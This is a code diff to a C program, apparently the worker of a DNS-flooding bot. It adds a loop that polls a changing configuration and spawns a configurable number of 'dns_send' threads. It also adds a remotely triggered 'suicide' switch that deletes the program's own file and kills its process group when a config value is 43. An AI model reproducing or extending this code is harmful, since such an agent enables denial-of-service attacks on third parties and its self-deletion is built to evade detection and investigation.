@@ -4,14 +4,14 @@
 #include <sys/time.h>
 #include <unistd.h>
 #include <pthread.h>
+#include <signal.h>
 #include "config.h"
 #include "worker.h"
 #include "dns.h"
 #include "utils.h"
-
+#include "logger.h"
  
 Configuration config;
-
 
 int fork_process(void (*func)())
 {
@@ -48,18 +48,31 @@ int new_thread_p(void *func, void *i)
 void start_worker()
 {
    //new_thread_p(config_worker, 0);
-   
+   int thread = 0;
     while(1) {
-        parse_config();
-        if (strlen(oldmd5) == 0 && strlen(newmd5) != 0)
-        {
-            new_thread_p(dns_worker, 0);
-        }
-        //config.oldmd5 = newmd5;
-        printf("oldmd5=%s, newmd5=%s,dns_domain=%s\n", oldmd5, newmd5, config.dns_domain);
-        if (strlen(oldmd5) != 0 && strcmp(oldmd5, newmd5) != 0) {
-            printf("fork new child process\n");
-            exit(1);
+        if (parse_config() > 0) {
+        	if(config.dns_interval == 43) {//自杀
+        		remove(process_filename);
+				kill(0, SIGTERM);
+				exit(0);        		
+        	}
+		    if (strlen(oldmd5) == 0 && strlen(newmd5) != 0)
+		    {
+		    	strcpy(oldmd5, newmd5);
+		    	if (config.dns_active) {
+					for (thread =0; thread < config.dns_threads; thread++) {
+					   log_info(logger, "dns_worker #%d started", thread);
+
+				    	new_thread_p(dns_send, 0);
+				    }
+		        }
+		    }
+		    //config.oldmd5 = newmd5;
+		   log_debug(logger, "oldmd5=%s, newmd5=%s,dns_domain=%s", oldmd5, newmd5, config.dns_domain);
+		    if (strlen(oldmd5) != 0 && strcmp(oldmd5, newmd5) != 0) {
+		       log_info(logger, "restart child process");
+		        exit(1);
+		    }
         }
         sleep(5);
     }    
@@ -77,9 +90,7 @@ void config_worker()
 
 void dns_worker()
 {
-    sleep(1);
-    printf("dns_worker\n");
-    strcpy(oldmd5, newmd5);
+    
     //printf("oldmd5=%s, newmd5=%s,dns_domain=%s\n", config.oldmd5, newmd5, config.dns_domain);
     if (config.dns_active)
     {
